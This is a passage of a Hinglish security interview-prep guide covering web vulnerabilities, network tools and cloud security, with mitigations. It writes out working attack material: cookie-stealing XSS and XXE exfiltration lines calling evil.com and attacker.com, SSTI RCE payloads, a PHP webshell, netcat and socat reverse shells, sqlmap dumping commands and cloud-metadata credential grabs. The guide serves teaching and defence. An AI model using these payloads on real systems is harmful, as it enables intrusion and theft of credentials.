-- Normal query
SELECT name, email FROM users WHERE id = 1;

-- UNION injection
SELECT name, email FROM users WHERE id = 1 UNION SELECT username, password FROM admin;

-- Finding column count
' ORDER BY 1--   → works
' ORDER BY 2--   → works  
' ORDER BY 3--   → error (2 columns only)
```

**Blind SQLi (Boolean-based):**
Server response true/false ke difference se data nikalna.
```sql
-- Check if injection works (page loads normally)
' AND 1=1--   → true (normal page)

-- Check if vulnerable (page different)
' AND 1=2--   → false (error/blank page)

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'--
```

**Time-based Blind SQLi:**
Time delay use karke data infer karna.
```sql
-- MySQL
' AND SLEEP(5)--
' IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a', SLEEP(5), 0)--

-- PostgreSQL
' AND pg_sleep(5)--

-- SQL Server
'; WAITFOR DELAY '0:0:5'--
```

**Second-Order SQLi:**
Input pehle safely store hota hai, baad mein unsafe context mein use hota hai.
```
Step 1: Signup with username = "admin' --"
Step 2: Username safely stored in DB (parameterized insert)
Step 3: Admin views "user details" page — username used in query without parameterization
Step 4: SQL injection triggers!
```

**Automated Exploitation with sqlmap:**
```bash
# Basic usage
sqlmap -u "http://target.com/page?id=1"

# Get databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Get tables from a database
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Dump table data
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment --random-agent
```

### XSS Types — Reflected, Stored, DOM-based

**Reflected XSS:**
Input immediate response mein reflect hota hai — non-persistent.
```html
<!-- Vulnerable search page -->
<form action="/search">
  <input name="q" value="<?php echo $_GET['q']; ?>">
</form>

<!-- Payload: -->
/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

**Stored XSS:**
Malicious script DB mein store hoti hai — har visitor trigger kare.
```html
<!-- Comment section vulnerable -->
<div class="comment">
  <?php echo $comment['body']; ?>  <!-- No sanitization -->
</div>

<!-- Attacker posts comment with: -->
<script>
  new Image().src = 'https://evil.com/steal.php?c='+document.cookie;
</script>

<!-- Every comment page visitor ka cookie attacker ko jaata hai -->
```

**DOM-based XSS:**
Client-side JavaScript mein vulnerability — server data nahi dekhta.
```javascript
// Vulnerable code
const name = new URL(window.location.href).searchParams.get('name');
document.getElementById('greeting').innerHTML = 'Hello ' + name;

// Payload in URL: ?name=<img src=x onerror=alert(document.cookie)>
// Server normal request dekhega — no malicious input in server logs
```

**XSS Prevention:**
```javascript
// DO NOT use innerHTML with user input
element.innerHTML = userInput;   // XSS vulnerable

// Use textContent instead
element.textContent = userInput; // Safe — treats as text, not HTML

// For cases needing HTML: Use DOMPurify
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

### CSRF Protection — Synchronizer Token Pattern

CSRF tab hota hai jab attacker kisi aur site se tumhari session ka use karke request bhejta hai.

**Synchronizer Token Pattern Implementation:**
```python
from secrets import token_hex
import hmac

class CSRFProtection:
    def __init__(self):
        self.secret = token_hex(32)

    def generate_token(self, session_id):
        """Generate CSRF token tied to session"""
        return hmac.new(
            self.secret.encode(),
            session_id.encode(),
            'sha256'
        ).hexdigest()

    def validate_token(self, session_id, token):
        """Validate CSRF token"""
        expected = self.generate_token(session_id)
        return hmac.compare_digest(expected, token)

# Usage in Flask
app = Flask(__name__)
csrf = CSRFProtection()

@app.route('/transfer', methods=['POST'])
def transfer_money():
    token = request.form.get('csrf_token')
    if not csrf.validate_token(session['id'], token):
        return "CSRF detected!", 403
    # Process transfer...
```

**HTML Form with Token:**
```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
  <input name="amount" type="text">
  <input name="to_account" type="text">
  <button type="submit">Transfer</button>
</form>
```

**SameSite Cookie Attribute:**
```python
# Server sets cookie with SameSite
response.set_cookie('sessionid', session_id, 
                    samesite='Lax',  # 'Strict' or 'Lax'
                    secure=True,
                    httponly=True)
```
- `SameSite=Strict`: Cookie sirf same-site requests mein bheja jaata hai
- `SameSite=Lax`: Top-level navigation requests mein bhi cookie jaati hai (form submit)
- `SameSite=None`: Cookie saare cross-site requests mein jaati hai (needs Secure flag)

### SSRF Deep-Dive

SSRF (Server-Side Request Forgery) mein attacker server ko internal resources pe request bhejne ke liye force karta hai.

**How to Test SSRF:**
```bash
# 1. Find parameters that load external resources
# Look for: url, image, file, download, fetch, callback, redirect

# 2. Test with external request bin
# Use interactsh or webhook.site to catch outbound requests
POST /proxy
Host: target.com
{"url": "http://your-collaborator.com/test"}

# 3. Test internal IPs
curl "http://target.com/fetch?url=http://127.0.0.1:80"
curl "http://target.com/fetch?url=http://127.0.0.1:8080"
curl "http://target.com/fetch?url=http://127.0.0.1:3306"

# 4. Cloud metadata endpoints
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
```

**Blind SSRF:**
Response directly visible nahi hai, but outbound request server se ja rahi hai.
```
Detection: Interact.sh client ya Burp Collaborator use karo
Out-of-band: Request external service → callback aaya matlab SSRF hai
Example: Server profile picture URL fetch karta hai — aapni collaborator URL do
```

**Cloud Metadata Exploit:**
```bash
# AWS metadata (IMDSv1)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role

# GCP metadata  
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata
curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

**SSRF Mitigations:**
- Block private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Allowlist of required external domains
- Disable URL redirects (or validate redirect destination)
- Use URL parsing libraries correctly (canonicalize URLs)
- IMDSv2 use karo with session tokens

### File Upload Vulnerability Testing

File upload vulnerabilities bohot serious ho sakti hain — RCE tak.

**Testing Checklist:**
```bash
# 1. Bypass extension filter
file.php.jpg
file.php%00.jpg
file.pHp (case manipulation)
file.php;.jpg 
file.php.
file.php. (Windows trailing dots removed)

# 2. Content-type bypass
# Intercept upload request, change:
Content-Type: image/jpeg  →  Content-Type: text/php

# 3. Magic bytes check bypass
# Add GIF header before PHP code:
GIF89a<?php system($_GET['cmd']); ?>
# Tools like exiftool bhi fool ho sakte hain

# 4. Path traversal in filename
filename="../../var/www/html/shell.php"

# 5. ZIP symlink — upload zip with symlink to /etc/passwd
```

**Secure Upload Implementation:**
```python
import os
import magic
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'pdf', 'png', 'jpg', 'jpeg'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def validate_upload(file):
    # 1. Check extension
    ext = file.filename.rsplit('.', 1)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return False

    # 2. Check MIME type (content, not header)
    mime = magic.from_buffer(file.read(2048), mime=True)
    if mime not in ['image/jpeg', 'image/png', 'application/pdf']:
        return False

    # 3. Check file size
    file.seek(0, os.SEEK_END)
    if file.tell() > MAX_FILE_SIZE:
        return False

    # 4. Sanitize filename
    safe_name = secure_filename(file.filename)

    # 5. Store outside webroot or with non-execute permissions
    upload_path = os.path.join('/secure_uploads', safe_name)
    file.seek(0)
    file.save(upload_path)

    return True
```

### XXE (XML External Entity) Attack

XXE tab hota hai jab XML parser external entities ko resolve karta hai.

**Basic XXE — File Read:**
```xml
<!-- Payload -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

**XXE — SSRF:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<user><name>&xxe;</name></user>
```

**Blind XXE — Out-of-band:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<user><name>&exfil;</name></user>

<!-- xxe.dtd hosted on attacker server: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &exfil; SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

**XXE Mitigation:**
```python
# Python — disable external entities
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)

# Java — disable XXE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
```

### IDOR Detection Methodology

IDOR (Insecure Direct Object Reference) — user apna identifier change karke kisi aur ka data access karta hai.

**Detection Steps:**
```
1. Find endpoints with object identifiers
   /api/user/123, /api/order/INV-456, /download/file?id=789

2. Create two accounts (User A, User B)
   A kaa ID = 100, B kaa ID = 101

3. Login as A, try B's ID
   GET /api/user/101 with A's token

4. If user B's data visible → IDOR vulnerability
```

**Common IDOR Patterns:**
```bash
# Numeric IDs
GET /api/invoice/1001 → change to /api/invoice/1002

# UUIDs (harder but possible)
GET /api/user/abc-def-ghi → check if another user's UUID accessible

# Base64 encoded IDs
GET /api/user/dXNlcl8xMjM= (base64 of "user_123")
# Decode → change → re-encode

# Hashed IDs (weak hash)
GET /api/user/md5(123) → weak hash, can guess other values
```

**IDOR Prevention:**
```python
# Always verify ownership on server side
@app.get("/api/invoice/{invoice_id}")
def get_invoice(invoice_id, current_user):
    invoice = Invoice.query.get(invoice_id)
    
    # Authorization check
    if invoice.user_id != current_user.id and not current_user.is_admin:
        raise Forbidden("Access denied")
    
    return invoice.to_dict()
```

### SSTI (Server-Side Template Injection)

SSTI tab hota hai jab user input template engine mein bina sanitization ke inject ho jaata hai.

**Jinja2 (Python) SSTI:**
```python
# Vulnerable code
from flask import render_template_string

@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    template = f"<h1>Hello {name}!</h1>"  # User input in template
    return render_template_string(template)

# Payload: ?name={{7*7}}
# Output: <h1>Hello 49!</h1>  ← SSTI confirmed!

# RCE via SSTI:
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
{{ lipsum.__globals__['os'].popen('cat /etc/passwd').read() }}
```

**SSTI Detection:**
```
Basic test: {{7*7}} → 49
Alternative: ${7*7} → 49 (Freemarker)
Simple: <%= 7*7 %> → 49 (ERB)
```

**SSTI Mitigation:**
- Never pass user input directly to template engine
- Use template files (render_template) instead of strings (render_template_string)
- Sandboxed template environment use karo (Jinja2 sandbox)
- Context-aware auto-escaping enable karo

### Directory Traversal

Directory traversal se attacker webroot ke bahar files read kar sakta hai.

**Basic Payloads:**
```bash
# Linux
../../../etc/passwd
../../../../etc/shadow
....//....//....//etc/passwd  (bypass naive filters)
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd  (URL encoded)

# Windows
..\..\..\windows\system32\config\sam
....\....\....\windows\win.ini
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
```

**Detection and Exploitation:**
```python
# Vulnerable code
@app.route('/download')
def download():
    filename = request.args.get('file', '')
    filepath = '/var/www/files/' + filename
    return send_file(filepath)

# Exploit:
# /download?file=../../../etc/passwd
# /download?file=../../../var/log/apache2/access.log
```

**Mitigation:**
```python
import os

def safe_download(filename):
    # 1. Use basename — strip directory components
    safe_name = os.path.basename(filename)
    
    # 2. Join with root directory
    filepath = os.path.join('/var/www/files/', safe_name)
    
    # 3. Canonicalize (resolve symlinks, .. etc.)
    filepath = os.path.realpath(filepath)
    
    # 4. Verify path starts with allowed root
    if not filepath.startswith('/var/www/files/'):
        raise ValueError("Invalid path")
    
    return send_file(filepath)
```

### Chapter 4: Interview Q&A

**Q1: SQL injection aur XSS mein kya difference hai?**
- SQLi: Database ko target karta hai — data extract, modify, delete
- XSS: Browser ko target karta hai — user ke cookies steal, actions perform
- SQLi ka source: Direct database queries mein input concat
- XSS ka source: HTML/JS output mein input reflect
- Mitigation: SQLi = parameterized queries, XSS = output encoding + Content-Security-Policy

**Q2: CSRF vs XSS mein difference?**
- CSRF: User ke session ka use karke unauthorized action — trust on site credentials
- XSS: Site ki trust ka use karke browser mein script run — trust on site content
- CSRF authentication bypass nahi karta — existing session use karta hai
- XSS authentication bypass kar sakta hai — session token steal karke
- CSRF mitigation: CSRF tokens, SameSite cookies | XSS mitigation: Output encoding, CSP

**Q3: File upload vulnerability se RCE kaise hota hai?**
- Webshell upload: PHP file upload karo → web accessible path → direct code execution
- .htaccess override: PHP execution enable karo in upload directory
- Phar deserialization: .phar file upload karo → internal PHP objects trigger
- SSI injection: .shtml file → Server-Side Includes ka command execution
- Zip symlink: Zip mein symlink banao → unzip pe system file /var/www mein copy

**Q4: SSRF aur XXE mein difference batao.**
- SSRF: Outbound request — server requests bhejta hai internal/external URLs pe
- XXE: XML parsing — attacker defined entities ko parser evaluate karta hai
- SSRF target: Internal services, cloud metadata, file servers
- XXE target: File reading (file://), SSRF (http://), denial of service
- Both similar impact but different attack vectors

**Q5: DOM-based XSS reflected XSS se kaise different hai?**
- Reflected XSS: Server user input process karta hai aur response mein reflect karta hai
- DOM XSS: Server involve nahi hota — client-side JavaScript vulnerable hai
- Reflected: Attack visible in server access logs (malicious parameter in request)
- DOM: Server logs normal dikhte hain — malicious script browser mein hi execute hota hai
- Detection difficulty: DOM XSS harder to detect via WAF or server-side logging

---

## Chapter 5: Network Security

### Firewall Rules (Linux iptables example)
```bash
# Block all incoming traffic by default
iptables -P INPUT DROP
iptables -P FORWARD DROP

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH, HTTP, HTTPS
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
```

### IDS/IPS Detection Rules (Snort)
```
alert tcp $EXTERNAL_NET any -> $HOME_NET 80
(msg:"SQL Injection Attempt";
content:"' OR"; nocase; sid:100001;)
```

### Wireshark Filters
```
http.request          — Show HTTP requests
tcp.port == 443       — Show HTTPS traffic
ip.addr == 192.168.1.1 — Filter by IP
tcp.flags.syn == 1    — Show SYN packets
```

### Network Attacks & Mitigations
| Attack | Mitigation |
|--------|-----------|
| DDoS | Rate limiting, CDN, WAF |
| Man-in-the-Middle | TLS, certificate pinning |
| DNS Spoofing | DNSSEC |
| ARP Poisoning | Dynamic ARP Inspection |
| SYN Flood | SYN cookies, connection limits |

### Wireshark Practical Filters and Analysis Steps

Wireshark network incident investigation ke liye sabse powerful tool hai. Practical filters:

**Filter by Protocol and Port:**
```
# HTTP traffic only
http
tcp.port == 80 || tcp.port == 8080

# DNS queries and responses
dns

# Full TLS handshake view
tls.handshake.type == 1   (Client Hello)
tls.handshake.type == 2   (Server Hello + Cert)
tls.handshake.type == 11  (Certificate)
tls.handshake.type == 16  (Encrypted Extensions)

# ARP traffic
arp
arp.duplicate-address-detected  (DAD — possible conflict/spoof)
```

**Filter by IP and Behavior:**
```
# Specific host communication
ip.addr == 10.0.0.5
ip.src == 192.168.1.100 && ip.dst == 10.0.0.1

# External communication (not private IPs)
!(ip.src == 10.0.0.0/8 or ip.src == 172.16.0.0/12 or ip.src == 192.168.0.0/16)

# Detect port scans
tcp.flags.syn == 1 and tcp.flags.ack == 0  (SYN packets to multiple ports)

# Suspicious HTTP methods
http.request.method == "POST" and http.request.uri contains "admin"
```

**Traffic Analysis Steps for Incident Investigation:**
```
Step 1: Identify suspicious hosts by total traffic volume
  Statistics → IPv4 Statistics → All Addresses
  Outliers find karo (10x normal traffic)

Step 2: Find malicious domains
  Look for DNS queries to unknown domains
  Filter: dns.qry.name contains ".xyz" or dns.qry.name contains ".top"

Step 3: Check for data exfiltration
  Look for large outbound DNS responses (TXT record abuse)
  Filter: dns.txt && frame.len > 500

Step 4: Detect beaconing patterns
  Filter communication to external IP on high ports
  Check inter-packet timing (Tools → IO Graph)
  Regular intervals = possible C2 beacon

Step 5: Extract files from capture
  File → Export Objects → HTTP/SMB/TFTP
  Save all transferred files for malware analysis
```

**Command-line with tshark:**
```bash
# Capture live traffic
tshark -i eth0 -w capture.pcap

# Read and filter pcap
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# Extract HTTP objects
tshark -r capture.pcap --export-objects http,./extracted/
```

### Nmap Detailed Scan Types

Nmap ke different scan types alag-alag network scenarios mein use hote hain:

**SYN Scan (Half-open) — Default, fastest:**
```bash
nmap -sS target.com
```
- SYN packet bhejo → SYN/ACK mile toh port open
- RST mile toh closed
- Three-way handshake complete nahi hota — log nahi hota
- Requires root/admin privileges
- **Best for:** Stealthy scanning, production networks

**TCP Connect Scan — Full handshake:**
```bash
nmap -sT target.com
```
- SYN → SYN/ACK → ACK (full handshake)
- Logged by applications and firewalls
- No root required
- **Best for:** Non-root users, Windows systems

**UDP Scan — Slow but necessary:**
```bash
nmap -sU -p 53,161,500 target.com
```
- UDP open = no response (or protocol-specific response)
- UDP closed = ICMP Port Unreachable
- Very slow — rate limit ke saath use karo
- **Best for:** DNS, SNMP, DHCP services

**Stealth Scans — FIN, NULL, Xmas:**
```bash
nmap -sF target.com   # FIN scan
nmap -sN target.com   # NULL scan
nmap -sX target.com   # Xmas scan
```
- Send packets with unusual TCP flags
- Open port = no response | Closed port = RST
- Can bypass some stateless firewalls
- Windows ignores these packets — always shows all filtered
- **Best for:** Evading IDS/IPS (limited usefulness today)

**Additional Scan Types:**
```bash
# Version detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Aggressive scan (all features)
nmap -A target.com

# Skip ping (host is alive assumption)
nmap -Pn target.com

# Script scanning
nmap -sC target.com   # Default scripts
nmap --script vuln target.com  # Vulnerability scripts
```

### Netcat / Socat — Swiss Army Knives

Netcat (nc) aur socat network debugging aur red team operations mein essential tools hain.

**Port Listening with Netcat:**
```bash
# Listen on port 4444
nc -lvnp 4444

# Connect to remote
nc -nv target.com 80

# Banner grabbing
echo "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc -nv target.com 80
```

**Reverse Shell with Netcat:**
```bash
# Attacker side (listener)
nc -lvnp 4444

# Target side (connect back)
# Linux target:
nc -e /bin/bash attacker-ip 4444

# Windows target:
nc -e cmd.exe attacker-ip 4444

# If -e not available (modern nc):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker-ip 4444 >/tmp/f
```

**Bind Shell with Netcat:**
```bash
# Target opens port for attacker to connect
nc -lvnp 4444 -e /bin/bash

# Attacker connects to target
nc -nv target-ip 4444
```

**Socat — Advanced Features:**
```bash
# SSL-encrypted reverse shell
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork STDIO

# Connect back with SSL
socat OPENSSL:attacker-ip:443,verify=0 EXEC:/bin/bash

# Port forwarding
socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80

# Transfer files
socat TCP-LISTEN:4444 OPEN:received_file,creat
# On sender: socat OPEN:file_to_send TCP:target-ip:4444
```

### VPN Protocols Comparison

| Feature | OpenVPN | WireGuard | IPsec (IKEv2) |
|---------|---------|-----------|---------------|
| **Performance** | Medium | Fastest | Medium |
| **Security** | High (AES-256, TLS 1.3) | High (ChaCha20, Noise) | High (AES, 3DES) |
| **Complexity** | Complex config | Simple (fewer lines) | Very complex |
| **Kernel Integration** | Userspace | Kernel (Linux 5.6+) | Kernel built-in |
| **Handshake** | Full TLS | 1-RTT (1 round trip) | 2-4 RTT |
| **Codebase** | ~600K lines | ~4K lines | ~400K lines |
| **Mobile Support** | Good (OpenVPN Connect) | Native in Android | Native in iOS/Windows |
| **Auditability** | Well-audited | Newer, fewer audits | Heavily audited |

**When to use what:**
- OpenVPN: Enterprise, compliance-heavy environments
- WireGuard: Performance-critical, modern infra, IoT
- IPsec: Legacy compatibility, native OS integration

### Network Segmentation

**VLAN (Virtual LAN):**
```
Broadcast domain ko logically divide karo — same switch, different networks
Example: VLAN 10 = Web Servers, VLAN 20 = DB Servers, VLAN 30 = Management
```
- Inter-VLAN routing ke liye Router-on-a-stick ya Layer 3 switch
- Security: DB VLAN mein sirf Web VLAN se access, management VLAN completely isolated

**DMZ (Demilitarized Zone):**
```
Internet → Firewall → DMZ (Web, Mail, DNS servers)
                 ↓
          Internal Network (DB, File, App servers)
```
- DMZ servers internet facing — limited internal access
- Doosri zone se compromise ho toh internal safe
- Bastion host DMZ mein — internal access ka gateway

**Microsegmentation:**
```
Traditional: Ek firewall → ek subnet (all or nothing)
Microsegmentation: Har workload ke liye individual firewall policies
```
- Zero-Trust approach — even within same network, every connection verified
- Implemented with: NSX (VMware), Calico (Kubernetes), Illumio
- Benefit: Ransomware lateral movement rokta hai — ek server infect hua toh baaki safe

### Zero Trust Network Access (ZTNA)

ZTNA traditional VPN ko replace karta hai. "Never trust, always verify" — bharose ki jagah har request verify karo.

**Core Principles:**
```
1. Verify explicitly — har request authenticate + authorize karo
2. Least privilege access — sirf needed resource access do
3. Assume breach — network secure hai ye assume mat karo
```

**ZTNA vs VPN:**
| Aspect | VPN | ZTNA |
|--------|-----|------|
| Access | Full network | App-specific |
| Auth | Login only | Every request |
| Visibility | Blind to individual apps | Granular |
| Lateral movement | Possible | Blocked |
| User experience | Slow (hairpinning) | Faster (edge-based) |

**ZTNA Solutions:**
- Cloudflare Access + Tunnel
- Zscaler Private Access (ZPA)
- AWS Verified Access
- Tailscale (WireGuard-based)
- Palo Alto Prisma Access

**Interview Answer Template:**
"VPN gives you keys to the whole building. ZTNA gives you a key to your specific office only — and it rechecks your ID at every door."

### Chapter 5: Interview Q&A

**Q1: SYN scan vs TCP Connect scan mein kya difference hai?**
- SYN scan: Half-open — SYN + SYN/ACK, immediately RST send karo, handshake incomplete
- TCP Connect: Full handshake — SYN + SYN/ACK + ACK, connection established and closed
- SYN scan faster and stealthier (not logged by most apps)
- TCP Connect logged everywhere (completed connection)

**Q2: Wireshark mein HTTP vs HTTPS traffic kaise filter karein?**
- HTTP: `http` filter — requests, responses, methods, URIs sab dikhta hai
- HTTPS: `tls.port == 443` — only encrypted packets, content visible nahi
- For HTTPS analysis: Need pre-shared key (SSLKEYLOGFILE environment variable)
- Set env `SSLKEYLOGFILE=keys.log` in browser → Wireshark mein load karo `Edit → Preferences → TLS → (Pre)-Master-Secret log filename`

**Q3: Reverse shell vs bind shell mein difference?**
- Reverse shell: Target connects to attacker (firewall outbound — usually allowed)
- Bind shell: Target opens port, attacker connects (firewall inbound — often blocked)
- Reverse shell more common in real-world — outbound traffic less restricted
- Example: Netcat reverse `nc -e /bin/bash attacker-ip 4444` | Bind `nc -lvnp 4444 -e /bin/bash`

**Q4: VPN vs ZTNA comparison interview mein kaise batayein?**
- VPN: "Tumhare poore network ka gate open kar deta hai — ek baar andar, sab access"
- ZTNA: "Har app ka alag door hai — har request pe ID check hoti hai"
- VPN: Broad attack surface, lateral movement possible
- ZTNA: Application-specific, lateral movement blocked, better for zero trust

**Q5: DMZ kya hota hai? Interview mein simple way mein kaise samjhayein?**
- DMZ semi-trusted network zone hai between internet and internal network
- Web servers yahan rakhte hain — agar hack bhi ho jaye, internal network safe
- Example: Company ka website DMZ mein, customer database internal mein
- DMZ ka firewall allow karega sirf web traffic (ports 80, 443) DMZ tak, internal sirf specific IP/port allowed

---

## Chapter 6: Cloud Security

### AWS Security Best Practices
```
IAM: Least privilege, use roles not keys, enable MFA
S3: Block public access, enable encryption, versioning
EC2: Security groups restrict access, patch AMIs
CloudTrail: Enable in all regions, log to S3
GuardDuty: Enable threat detection
```

### Container Security (Docker)
```dockerfile
# Multi-stage build reduces attack surface
FROM node:18 AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM node:18-slim
COPY --from=builder /app /app
USER node                    # Don't run as root
```

### DevSecOps — Security in CI/CD
```yaml
# GitHub Actions with security scanning
- name: SAST Scan
  run: semgrep --config=auto .
- name: Dependency Scan
  run: npm audit
- name: Container Scan
  run: trivy image myapp:latest
```

### AWS S3 Bucket Policy — Public Access Detection

S3 bucket misconfiguration ek common cloud vulnerability hai. Public access detect karne ka script:

```python
import boto3

def check_s3_bucket_public_access():
    s3 = boto3.client('s3')
    buckets = s3.list_buckets()['Buckets']

    for bucket in buckets:
        name = bucket['Name']
        try:
            # Check bucket ACL
            acl = s3.get_bucket_acl(Bucket=name)
            for grant in acl['Grants']:
                if 'URI' in grant.get('Grantee', {}) and 'AllUsers' in grant['Grantee']['URI']:
                    print(f"[!] Public ACL on bucket: {name}")

            # Check bucket policy
            policy = s3.get_bucket_policy(Bucket=name)
            if 'Effect": "Allow"' in policy['Policy'] and '"Principal": "*"' in policy['Policy']:
                print(f"[!] Public policy on bucket: {name}")

            # Check Block Public Access settings
            bpa = s3.get_public_access_block(Bucket=name)
            config = bpa['PublicAccessBlockConfiguration']
            if not all([config['BlockPublicAcls'], config['IgnorePublicAcls'],
                        config['BlockPublicPolicy'], config['RestrictPublicBuckets']]):
                print(f"[!] Block Public Access not fully enabled: {name}")

        except Exception as e:
            print(f"[-] Error checking {name}: {e}")

check_s3_bucket_public_access()
```

### IAM Policy Evaluation Logic

AWS IAM policy evaluation ismein ek important concept hai — **explicit deny always wins**:

```
Evaluation Order: Explicit Deny → Explicit Allow → Default Deny

1. By default, ALL requests are DENIED (implicit deny)
2. If ANY policy has an explicit ALLOW — request ALLOWED
3. If ANY policy has an explicit DENY — request DENIED (overrides all allows)

Example:
  - Policy A: Allow s3:GetObject on bucket X
  - Policy B (SCP): Deny s3:GetObject on bucket X  
  - Result: DENIED (explicit deny > explicit allow)

Multi-account scenario:
  - Organization SCP (deny) → Account boundary → IAM policy → Resource policy
  - Koi bhi deny ho toh final result DENY
```

### Instance Metadata Service (IMDS) v1 vs v2

IMDS wo service hai jo EC2 instance ko credentials aur metadata provide karti hai.

**IMDSv1 (Vulnerable):**
```bash
# Direct GET — no authentication
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```

**IMDSv2 (Secure — Session-oriented):**
```bash
# Step 1: Get session token (PUT request)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token in subsequent requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

**SSRF Defense with IMDSv2:**
- Attacker: `http://169.254.169.254/latest/meta-data/` — FAIL with v2
- v2 requires PUT + token header — SSRF se exploit nahi ho sakta
- Best practice: Disable IMDSv1 via `MetadataOptions` in EC2 launch

### Cloud Security Tools — Detailed Commands

**ScoutSuite — Multi-cloud auditing:**
```bash
# AWS audit
scout aws --profile prod-profile --regions us-east-1

# Azure audit  
scout azure --cli

# GCP audit
scout gcp --service-account key.json

# Generate HTML report (default)
# Output: scout-report/results.html
```

**Pacu — AWS exploitation framework:**
```bash
# Set up
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip install -r requirements.txt

# Use
python pacu.py
Pacu > import_keys --profile default
Pacu > run iam__enum_users_roles_policies
Pacu > run ec2__enum
Pacu > run s3__find_public_buckets

# Privilege escalation modules
Pacu > run iam__privesc_scan
```

**Prowler — CIS Benchmark auditing:**
```bash
# Basic execution
prowler aws

# Check specific service
prowler aws --services s3

# Compliance framework
prowler aws --compliance cis_1.4

# Output formats
prowler aws -M html csv json
```

### Shared Responsibility Model

Cloud security mein sabse important concept — kaun kiske liye responsible hai:

```
┌─────────────────────────────────────┐
│  Customer: Data, IAM, Network       │  ← Customer responsible
│  Config, Encryption, OS patches     │
├─────────────────────────────────────┤
│  AWS/Azure/GCP: Physical, HW,       │  ← Provider responsible
│  Hypervisor, Network infra          │
└─────────────────────────────────────┘

IaaS (EC2): Customer manages OS, patches, firewall, app — AWS manages host
PaaS (RDS): AWS manages OS + DB engine — Customer manages access + data
SaaS (O365): Provider manages app + infra — Customer manages user access + data
```

**Common Interview Gotcha:**
"Data encryption kaun karega?" — Answer: Customer. Cloud provider environment encrypt kar sakta hai (encryption at rest with KMS), but customer ko configure karna padta hai. AWS default encryption nahi lagata — customer ko enable karna hota hai.

### Kubernetes Security

Kubernetes security ke 4 key areas:

**RBAC (Role-Based Access Control):**
```yaml
# Least privilege service account
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: { namespace: app, name: pod-reader }
rules:
- apiGroups: [""]
  resources: ["pods", "pods/log"]
  verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: { namespace: app, name: read-pods }
subjects:
- kind: ServiceAccount
  name: app-sa
roleRef:
  kind: Role
  name: pod-reader
```

**Pod Security Admission (PSP replacement):**
```yaml
apiVersion: pod-security.kubernetes.io/v1
kind: PodSecurityStandard
metadata:
  name: restricted
spec:
  # Profiles: privileged, baseline, restricted
  seccomp: { profiles: ["RuntimeDefault"] }
  runAsUser: { rule: "MustRunAsNonRoot" }
  capabilities: { drop: ["ALL"] }
```

**Network Policies:**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: deny-all }
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
  # Default deny — allow only what's needed
```

**Seccomp — Syscall Filtering:**
```yaml
# Restrict system calls available to containers
securityContext:
  seccompProfile:
    type: RuntimeDefault
```

### Container Image Scanning with Trivy

Trivy container images, filesystems, aur Git repos mein vulnerabilities scan karta hai.

```bash
# Scan container image
trivy image nginx:latest

# Scan with severity filter
trivy image --severity CRITICAL,HIGH myapp:latest

# Scan with output formats
trivy image --format json --output results.json python:3.9

# Scan filesystem
trivy fs --severity CRITICAL /path/to/project

